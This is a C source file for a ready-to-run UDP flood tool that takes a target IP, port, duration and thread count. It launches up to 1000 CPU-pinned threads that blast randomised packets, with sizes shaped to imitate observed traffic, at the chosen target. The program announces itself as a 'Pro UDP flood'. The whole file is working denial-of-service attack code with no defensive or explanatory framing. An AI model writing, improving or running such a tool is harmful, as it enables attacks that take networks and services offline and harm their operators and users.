#define _GNU_SOURCE    // Enable GNU-specific functions like pthread_setaffinity_np
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <signal.h>
#include <sched.h>  // For setting thread affinity

#define MAX_THREADS 1000
#define MAX_BUFFER_SIZE 256  // Adjust based on observed packet sizes

typedef struct {
    char *ip;
    int port;
    int duration;
    int thread_id;
} thread_data_t;

volatile sig_atomic_t stop = 0;  // Graceful termination flag

// Signal handler for graceful shutdown
void handle_signal(int sig) {
    stop = 1;
}

// Improved random number generator (like xorshift32)
uint32_t xorshift32() {
    static uint32_t state = 123456789; // Seed
    state ^= state << 13;
    state ^= state >> 17;
    state ^= state << 5;
    return state;
}

// Generate a packet payload similar to the provided UDP packets
void create_super_packet(char *buffer, int buffer_size) {
    for (int i = 0; i < buffer_size; i++) {
        buffer[i] = (char)(xorshift32() % 256);  // Random byte between 0-255
    }
}

// Adaptive packet size function based on observed ranges
int get_super_packet_size() {
    int rand_value = xorshift32() % 100;

    if (rand_value < 31) {
        return (xorshift32() % 7) + 4;   // Range: 4-10 bytes (small packets)
    } else if (rand_value < 39) {
        return (xorshift32() % 33) + 12; // Range: 12-44 bytes (medium packets)
    } else if (rand_value < 94) {
        return (xorshift32() % 93) + 78; // Range: 78-170 bytes (large packets)
    } else {
        return (xorshift32() % 33) + 170; // Range: 170-203 bytes (extra-large packets)
    }
}

void *super_udp_flood(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    int sockfd;
    struct sockaddr_in target;
    char *buffer = (char *)malloc(MAX_BUFFER_SIZE);
    int iteration_count = 0;
    int buffer_size = 0;
    int failed_sends = 0;
    int max_errors = 10;  // Max errors before adjusting send frequency

    // Initialize random seed using clock_gettime for better randomness
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    srand(ts.tv_nsec + data->thread_id);

    #ifdef _GNU_SOURCE
        // Set thread affinity (bind thread to a specific CPU core)
        cpu_set_t cpuset;
        CPU_ZERO(&cpuset);
        CPU_SET(data->thread_id % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);
        pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    #endif

    // Socket creation
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        free(buffer);  // Free the buffer memory
        pthread_exit(NULL);
    }

    // Increase the send buffer size
    int buff_size = 1024 * 1024;  // Example: 1 MB buffer
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &buff_size, sizeof(buff_size));

    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(data->port);
    inet_pton(AF_INET, data->ip, &target.sin_addr);

    time_t end_time = time(NULL) + data->duration;

    while (time(NULL) < end_time && !stop) {  // Stop if signal is received
        int pattern_choice = xorshift32() % 5;

        // Dynamically adjust iteration count and buffer size, now with randomized iteration counts
        switch (pattern_choice) {
            case 0:
                iteration_count = (xorshift32() % 1000) + 1000;  // Random between 1000 and 2000
                buffer_size = get_super_packet_size();
                break;
            case 1:
                iteration_count = (xorshift32() % 1500) + 500;   // Random between 500 and 2000
                buffer_size = (xorshift32() % 44) + 1;
                break;
            case 2:
                iteration_count = (xorshift32() % 500) + 500;    // Random between 500 and 1000
                buffer_size = get_super_packet_size();
                break;
            case 3:
                iteration_count = (xorshift32() % 250) + 250;    // Random between 250 and 500
                buffer_size = (xorshift32() % 10) + 1;
                break;
            case 4:
                iteration_count = (xorshift32() % 1000) + 500;   // Random between 500 and 1500
                buffer_size = get_super_packet_size();
                break;
        }

        // Consolidated loop to send packets
        for (int i = 0; i < iteration_count; i++) {
            create_super_packet(buffer, buffer_size);
            if (sendto(sockfd, buffer, buffer_size, 0, (struct sockaddr *)&target, sizeof(target)) < 0) {
                failed_sends++;
                if (failed_sends >= max_errors) {
                    printf("Thread %d: Adjusting due to too many sendto failures.\n", data->thread_id);
                    iteration_count = iteration_count / 2;  // Reduce load after too many errors
                    break;
                }
            }
        }
    }

    // Log number of failed sends if any
    if (failed_sends > 0) {
        printf("Thread %d: %d sendto failures occurred.\n", data->thread_id, failed_sends);
    }

    // Clean up
    close(sockfd);
    free(buffer);  // Free the buffer memory
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s <target IP> <port> <time duration> <threads>\n", argv[0]);
        exit(1);
    }

    // Signal handling for graceful termination
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);
    signal(SIGHUP, handle_signal);
    signal(SIGQUIT, handle_signal);

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int num_threads = atoi(argv[4]);

    if (num_threads > MAX_THREADS) {
        printf("Error: Maximum number of threads is %d\n", MAX_THREADS);
        exit(1);
    }

    printf("Pro UDP flood started to %s:%d with %d threads for time %d seconds.\n", ip, port, num_threads, duration);

    pthread_t threads[MAX_THREADS];
    thread_data_t thread_data[MAX_THREADS];

    for (int i = 0; i < num_threads; i++) {
        thread_data[i].ip = ip;
        thread_data[i].port = port;
        thread_data[i].duration = duration;
        thread_data[i].thread_id = i;

        if (pthread_create(&threads[i], NULL, super_udp_flood, (void *)&thread_data[i]) != 0) {
            perror("pthread_create failed");
            exit(1);
        }
    }

    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    return 0;
}
